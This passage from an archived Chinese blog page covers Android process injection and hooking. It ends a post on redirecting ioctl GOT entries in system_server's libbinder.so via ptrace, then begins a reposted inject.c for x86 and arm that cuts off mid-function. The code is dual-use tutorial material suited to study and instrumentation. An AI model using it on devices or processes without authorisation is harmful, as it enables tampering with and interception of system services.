margin-bottom: 2px">代码:</div><pre style="margin-top: 0px; margin-bottom: 0px; padding: 6px; border: 1px inset; width: 700px; overflow: auto; background-color: #dedfdf">&nbsp;&nbsp;&nbsp;read(fd,&nbsp;ehdr,&nbsp;sizeof(Elf32_Ehdr)); </pre></div><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;获得其Section&nbsp;Header区表的地址、数量和大小，并获得字符串表Section的索引号：</span><br /><br /><div style="color: #13253c; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; line-height: 19.4400005340576px; margin: 5px 20px 20px; background-color: #f5f5f5"><div class="smallfont" style="font-stretch: normal; line-height: normal; margin-bottom: 2px">代码:</div><pre style="margin-top: 0px; margin-bottom: 0px; padding: 6px; border: 1px inset; width: 700px; overflow: auto; background-color: #dedfdf">&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;shdr_addr&nbsp;=&nbsp;ehdr-&gt;e_shoff; &nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;shnum&nbsp;=&nbsp;ehdr-&gt;e_shnum; &nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;shent_size&nbsp;=&nbsp;ehdr-&gt;e_shentsize; &nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;stridx&nbsp;=&nbsp;ehdr-&gt;e_shstrndx; </pre></div><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;先提前把字符串表的内容读出来供遍历Section时比对其name用：</span><br /><br /><div style="color: #13253c; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; line-height: 19.4400005340576px; margin: 5px 20px 20px; background-color: #f5f5f5"><div class="smallfont" style="font-stretch: normal; line-height: normal; margin-bottom: 2px">代码:</div><pre style="margin-top: 0px; margin-bottom: 0px; padding: 6px; border: 1px inset; width: 700px; overflow: auto; background-color: #dedfdf">&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;读取Section&nbsp;Header中关于字符串表的描述，得到其尺寸和位置 &nbsp;&nbsp;&nbsp;&nbsp;lseek(fd,&nbsp;shdr_addr&nbsp;+&nbsp;stridx&nbsp;*&nbsp;shent_size,&nbsp;SEEK_SET); &nbsp;&nbsp;&nbsp;&nbsp;read(fd,&nbsp;shdr,&nbsp;shent_size);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;根据尺寸分配内存 &nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*&nbsp;string_table&nbsp;=&nbsp;(char&nbsp;*)malloc(shdr-&gt;sh_size); &nbsp;&nbsp;&nbsp;&nbsp;lseek(fd,&nbsp;shdr-&gt;sh_offset,&nbsp;SEEK_SET);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;将字符串表内容读入 &nbsp;&nbsp;&nbsp;&nbsp;read(fd,&nbsp;string_table,&nbsp;shdr-&gt;sh_size); </pre></div><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;再重新遍历Section&nbsp;Header，找名为.got表的Section：</span><br /><br /><div style="color: #13253c; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; line-height: 19.4400005340576px; margin: 5px 20px 20px; background-color: #f5f5f5"><div class="smallfont" style="font-stretch: normal; line-height: normal; margin-bottom: 2px">代码:</div><pre style="margin-top: 0px; margin-bottom: 0px; padding: 6px; border: 1px inset; width: 700px; overflow: auto; background-color: #dedfdf">&nbsp;&nbsp;&nbsp;&nbsp;lseek(fd,&nbsp;shdr_addr,&nbsp;SEEK_SET); &nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;i; &nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;shnum;&nbsp;i++&nbsp;) &nbsp;&nbsp;&nbsp;&nbsp;&#123; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read(fd,&nbsp;shdr,&nbsp;shent_size);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;shdr-&gt;sh_type&nbsp;==&nbsp;SHT_PROGBITS&nbsp;) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#123; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;name_idx&nbsp;=&nbsp;shdr-&gt;sh_name; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;strcmp(&amp;(string_table[name_idx]),&nbsp;&quot;.got&quot;)&nbsp;==&nbsp;0&nbsp;) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#123; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;就是&nbsp;GOT&nbsp;表！&nbsp;*/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*out_addr&nbsp;=&nbsp;base_addr&nbsp;+&nbsp;shdr-&gt;sh_offset; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*out_size&nbsp;=&nbsp;shdr-&gt;sh_size;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#125; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#125; &nbsp;&nbsp;&nbsp;&nbsp;&#125; </pre></div><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;这样，out_addr和out_size，就是system_server中libbinder.so的GOT表所在的位置和长度。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;然后搜索与Hook就好办了：</span><br /><br /><div style="color: #13253c; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; line-height: 19.4400005340576px; margin: 5px 20px 20px; background-color: #f5f5f5"><div class="smallfont" style="font-stretch: normal; line-height: normal; margin-bottom: 2px">代码:</div><pre style="margin-top: 0px; margin-bottom: 0px; padding: 6px; border: 1px inset; width: 700px; overflow: auto; background-color: #dedfdf">&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;out_size;&nbsp;i&nbsp;++) &nbsp;&nbsp;&nbsp;&nbsp;&#123; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptrace_readdata(target_pid,&nbsp;out_addr,&nbsp;&amp;got_item,&nbsp;4);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;got_item&nbsp;==&nbsp;old_ioctl_addr&nbsp;) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#123; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;!!!&nbsp;拿到了&nbsp;ioctl&nbsp;地址&nbsp;!!!&nbsp;改成我们的。&nbsp;*/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptrace_writedata(target_pid,&nbsp;out_addr,&nbsp;&amp;new_ioctl_addr,&nbsp;sizeof(new_ioctl_addr)); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#125; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if&nbsp;(&nbsp;got_item&nbsp;==&nbsp;new_ioctl_addr&nbsp;) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#123; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;已经是我们的了，不重复Hook。&nbsp;*/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#125; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out_addr++; &nbsp;&nbsp;&nbsp;&nbsp;&#125; </pre></div><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;写Android.mk将其在&nbsp;Android&nbsp;2.3&nbsp;源码树下编译后，adb&nbsp;push上去（共有注入程序、shellcode使用的共享库、我们的共享库三个文件），运行注入程序，提示注入成功。如果再次运行，则提示已经注入过了。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;再跑命令：</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;getprop&nbsp;persist.sys.ioctl.callcount</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;getprop&nbsp;persist.sys.ioctl.callcount</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;502</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;随便动动手机，数字在不断增加中，不过有点影响性能。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">======================================================================</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">四、补充说明</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">======================================================================</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;1、每个被加载的模块，无论是可执行程序还是共享库，均有自己独立的PLT和GOT表。所以拦截这个模块的对外调用的GOT，不影响其他模块。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;2、本文只实现了拦截模块的调出到其他模块的动作，其他模块的调入没有涉及到（可能还涉及到比较复杂的重定位操作）。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;3、system_server是system用户，不是有权限写所有名字的Property，这里用了persist.sys.开头的属性名，而persist.sys.开头的属性会保存至磁盘，因此性能会差点儿。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;4、ioctl虽然实质声明是个可变参数：int&nbsp;new_ioctl&nbsp;(int&nbsp;__fd,&nbsp;unsigned&nbsp;long&nbsp;int&nbsp;__request,&nbsp;/*void&nbsp;*&nbsp;arg*/&nbsp;...)，这种声明的函数要直接透明地将参数从旧函数传递给新函数似乎还不可行，搜了很多资料也没找到。幸好搜了一把libbinder.so源码，里头对ioctl的调用参数均是仨，干脆就不处理变长形式了。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;5、如果不以root身份运行注入程序，则ptrace附加时会失败。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;6、Andriod系统的大部分Service都运行在system_server进程中，可以拦截到。但部分自定义的用户Service在用户进程中，如需要拦截，则要ptrace到那个用户进程才行，拦截方法也类似。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;7、至于拦截Binder的数据分析与修改，则是下一篇文章的内容了。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">======================================================================</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">五、参考资料</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">======================================================================</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;http://wenku.baidu.com/view/222f348f84868762caaed558.html</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;http://blog.csdn.net/lingfong_cool/article/details/7976112</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;http://blog.csdn.net/ylyuanlu/article/details/6638825</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;http://os.pku.edu.cn:8080/gaikuang/submission/TN05.ELF.Format.Summary.pdf</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;http://blog.csdn.net/fengkehuan/article/details/6223406</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;http://blog.csdn.net/innost/article/details/6124685</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;还有不少，没法全写下来，在此向所有无私共享自己研究成果的人致以诚挚的谢意。&nbsp;</span>
	</div>
	<div class="textbox-bottom">
	</div>
	<div class="tags" style="display: none"> 
	</div>
</div><div class="textbox">
	<div class="textbox-calendar">
	<span class="textbox-calendar-month">Nov</span>
	<span class="textbox-calendar-day">26</span>
	</div>
	<div class="textbox-title">
		<h4>
		<a href="read.php-6194.htm" tppabs="http://i.renjihe.com/blog/read.php?6194">Android中的so注入(inject)和挂钩(hook) - For both x86 and arm</a> <span id="starid6194"><img src="unstarred.gif" tppabs="http://i.renjihe.com/blog/template/default/images/others/unstarred.gif" alt="" title="未加星标" border="0"/></span> <img src="blank.gif" tppabs="http://i.renjihe.com/blog/images/weather/blank.gif" alt="不指定" title="不指定"/>
		</h4>
		<div class="textbox-label">
		<a href="view.php-go=user_1.htm" tppabs="http://i.renjihe.com/blog/view.php?go=user_1" target="_blank">renjihe1988</a> , 21:41 , <a href="index.php-go=category_2.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_2" title="查看分类： 软件">软件</a> &raquo; <a href="index.php-go=category_57.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57" title="查看分类： 网络安全">网络安全</a> , <a href="read.php-6194.htm#reply" tppabs="http://i.renjihe.com/blog/read.php?6194#reply" title="发表您的评论">评论(0)</a> , <a href='javascript: void(0);' title="查看引用地址" onclick='showhidediv("tb6194");'>引用(0)</a> , <a href="read.php-6194.htm" tppabs="http://i.renjihe.com/blog/read.php?6194">阅读(1)</a> , Via 本站原创 
		</div>
	</div>
	<div id="tb6194" style="display: none;" class="textbox-tburl"><strong>引用功能被关闭了。</strong></div>
	
	<div class="textbox-content">
	<p style="margin: 0px; padding: 0px"><span style="font-family: Arial"><span style="font-size: 14px; line-height: 26px">http://blog.csdn.net/jinzhuojun/article/details/9900105</span></span><br /><span style="font-family: Arial"><span style="font-size: 14px; line-height: 26px">对于Android for arm上的so注入（inject）和挂钩（hook），网上已有牛人给出了代码-libinject（</span></span><a style="font-family: Arial; font-size: 14px; line-height: 26px; text-decoration: none; outline: none; color: #ca0000" href="javascript:if(confirm('http://bbs.pediy.com/read.php?6639  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://bbs.pediy.com/read.php?6639'" tppabs="http://bbs.pediy.com/showthread.php?t=141355" target="_blank">http://bbs.pediy.com/showthread.php?t=141355</a><span style="font-family: Arial"><span style="font-size: 14px; line-height: 26px">）。由于实现中的ptrace函数是依赖于平台的，所以不经改动只能用于arm平台。本文将之扩展了一下，使它能够通用于Android的x86和arm平台。Arm平台部分基本重用了libinject中的代码，其中因为汇编不好移植且容易出错，所以把shellcode.s用ptrace_call替换掉了，另外保留了mmap，用来传字符串参数，当然也可以通过栈来传，但栈里和其它东西混一起，一弄不好就会隔儿了，所以还是保险点好。最后注意设备要root。</span></span></p><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">首先创建目录及文件：</p><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">jni<br />&nbsp;&nbsp;&nbsp;&nbsp;inject.c<br />&nbsp;&nbsp;&nbsp;&nbsp;Android.mk<br />&nbsp;&nbsp;&nbsp;&nbsp;Application.mk</p><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">inject.c:</p><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px"></p><div class="dp-highlighter bg_cpp" style="font-family: Consolas, 'Courier New', Courier, mono, serif; border: 1px solid #1e4975; width: 936.53125px; overflow: auto; padding-top: 1px; color: #c0c0c0; line-height: 26px; margin: 18px 0px !important; background-color: #22252b"><ol class="dp-cpp" style="margin: 0px; padding: 5px 0px; border: none; position: relative; list-style-position: initial; list-style-image: initial"><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><br /></li></ol></div><span style="font-family: Arial"><div><span style="font-size: 14px; line-height: 26px">#include &lt;stdio.h&gt;</span></div><div><span style="font-size: 14px; line-height: 26px">#include &lt;stdlib.h&gt;</span></div><div><span style="font-size: 14px; line-height: 26px">#include &lt;asm/user.h&gt;</span></div><div><span style="font-size: 14px; line-height: 26px">#include &lt;asm/ptrace.h&gt;</span></div><div><span style="font-size: 14px; line-height: 26px">#include &lt;sys/ptrace.h&gt;</span></div><div><span style="font-size: 14px; line-height: 26px">#include &lt;sys/wait.h&gt;</span></div><div><span style="font-size: 14px; line-height: 26px">#include &lt;sys/mman.h&gt;</span></div><div><span style="font-size: 14px; line-height: 26px">#include &lt;dlfcn.h&gt;</span></div><div><span style="font-size: 14px; line-height: 26px">#include &lt;dirent.h&gt;</span></div><div><span style="font-size: 14px; line-height: 26px">#include &lt;unistd.h&gt;</span></div><div><span style="font-size: 14px; line-height: 26px">#include &lt;string.h&gt;</span></div><div><span style="font-size: 14px; line-height: 26px">#include &lt;elf.h&gt;</span></div><div><span style="font-size: 14px; line-height: 26px">#include &lt;android/log.h&gt;</span></div><div><span style="font-size: 14px; line-height: 26px">#if defined(__i386__)</span></div><div><span style="font-size: 14px; line-height: 26px">#define pt_regs user_regs_struct</span></div><div><span style="font-size: 14px; line-height: 26px">#endif</span></div><div><span style="font-size: 14px; line-height: 26px">#define ENABLE_DEBUG 1</span></div><div><span style="font-size: 14px; line-height: 26px">#if ENABLE_DEBUG</span></div><div><span style="font-size: 14px; line-height: 26px">#define LOG_TAG &quot;INJECT&quot;</span></div><div><span style="font-size: 14px; line-height: 26px">#define LOGD(fmt, args...) __android_log_print(ANDROID_LOG_DEBUG,LOG_TAG, fmt, ##args)</span></div><div><span style="font-size: 14px; line-height: 26px">#define DEBUG_PRINT(format,args...) &#92;</span></div><div><span style="font-size: 14px; line-height: 26px">LOGD(format, ##args)</span></div><div><span style="font-size: 14px; line-height: 26px">#else</span></div><div><span style="font-size: 14px; line-height: 26px">#define DEBUG_PRINT(format,args...)</span></div><div><span style="font-size: 14px; line-height: 26px">#endif</span></div><div><span style="font-size: 14px; line-height: 26px">#define CPSR_T_MASK ( 1u &lt;&lt; 5 )</span></div><div><span style="font-size: 14px; line-height: 26px">const char *libc_path = &quot;/system/lib/libc.so&quot;;</span></div><div><span style="font-size: 14px; line-height: 26px">const char *linker_path = &quot;/system/bin/linker&quot;;</span></div><div><span style="font-size: 14px; line-height: 26px">int ptrace_readdata(pid_t pid, uint8_t *src, uint8_t *buf, size_t size)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">uint32_t i, j, remain;</span></div><div><span style="font-size: 14px; line-height: 26px">uint8_t *laddr;</span></div><div><span style="font-size: 14px; line-height: 26px">union u &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">long val;</span></div><div><span style="font-size: 14px; line-height: 26px">char chars[sizeof(long)];</span></div><div><span style="font-size: 14px; line-height: 26px">&#125; d;</span></div><div><span style="font-size: 14px; line-height: 26px">j = size / 4;</span></div><div><span style="font-size: 14px; line-height: 26px">remain = size % 4;</span></div><div><span style="font-size: 14px; line-height: 26px">laddr = buf;</span></div><div><span style="font-size: 14px; line-height: 26px">for (i = 0; i &lt; j; i ++) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">d.val = ptrace(PTRACE_PEEKTEXT, pid, src, 0);</span></div><div><span style="font-size: 14px; line-height: 26px">memcpy(laddr, d.chars, 4);</span></div><div><span style="font-size: 14px; line-height: 26px">src += 4;</span></div><div><span style="font-size: 14px; line-height: 26px">laddr += 4;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">if (remain &gt; 0) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">d.val = ptrace(PTRACE_PEEKTEXT, pid, src, 0);</span></div><div><span style="font-size: 14px; line-height: 26px">memcpy(laddr, d.chars, remain);</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">return 0;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">int ptrace_writedata(pid_t pid, uint8_t *dest, uint8_t *data, size_t size)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">uint32_t i, j, remain;</span></div><div><span style="font-size: 14px; line-height: 26px">uint8_t *laddr;</span></div><div><span style="font-size: 14px; line-height: 26px">union u &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">long val;</span></div><div><span style="font-size: 14px; line-height: 26px">char chars[sizeof(long)];</span></div><div><span style="font-size: 14px; line-height: 26px">&#125; d;</span></div><div><span style="font-size: 14px; line-height: 26px">j = size / 4;</span></div><div><span style="font-size: 14px; line-height: 26px">remain = size % 4;</span></div><div><span style="font-size: 14px; line-height: 26px">laddr = data;</span></div><div><span style="font-size: 14px; line-height: 26px">for (i = 0; i &lt; j; i ++) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">memcpy(d.chars, laddr, 4);</span></div><div><span style="font-size: 14px; line-height: 26px">ptrace(PTRACE_POKETEXT, pid, dest, d.val);</span></div><div><span style="font-size: 14px; line-height: 26px">dest += 4;</span></div><div><span style="font-size: 14px; line-height: 26px">laddr += 4;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">if (remain &gt; 0) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">d.val = ptrace(PTRACE_PEEKTEXT, pid, dest, 0);</span></div><div><span style="font-size: 14px; line-height: 26px">for (i = 0; i &lt; remain; i ++) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">d.chars[i] = *laddr ++;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">ptrace(PTRACE_POKETEXT, pid, dest, d.val);</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">return 0;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">#if defined(__arm__)</span></div><div><span style="font-size: 14px; line-height: 26px">int ptrace_call(pid_t pid, uint32_t addr, long *params, uint32_t num_params, struct pt_regs* regs)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">uint32_t i;</span></div><div><span style="font-size: 14px; line-height: 26px">for (i = 0; i &lt; num_params &amp;&amp; i &lt; 4; i ++) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">regs-&gt;uregs[i] = params[i];</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">//</span></div><div><span style="font-size: 14px; line-height: 26px">// push remained params onto stack</span></div><div><span style="font-size: 14px; line-height: 26px">//</span></div><div><span style="font-size: 14px; line-height: 26px">if (i &lt; num_params) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">regs-&gt;ARM_sp -= (num_params - i) * sizeof(long) ;</span></div><div><span style="font-size: 14px; line-height: 26px">ptrace_writedata(pid, (void *)regs-&gt;ARM_sp, (uint8_t *)&amp;params[i], (num_params - i) * sizeof(long));</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">regs-&gt;ARM_pc = addr;</span></div><div><span style="font-size: 14px; line-height: 26px">if (regs-&gt;ARM_pc &amp; 1) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">/* thumb */</span></div><div><span style="font-size: 14px; line-height: 26px">regs-&gt;ARM_pc &amp;= (~1u);</span></div><div><span style="font-size: 14px; line-height: 26px">regs-&gt;ARM_cpsr &#124;= CPSR_T_MASK;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125; else &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">/* arm */</span></div><div><span style="font-size: 14px; line-height: 26px">regs-&gt;ARM_cpsr &amp;= ~CPSR_T_MASK;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">regs-&gt;ARM_lr = 0;</span></div><div><span style="font-size: 14px; 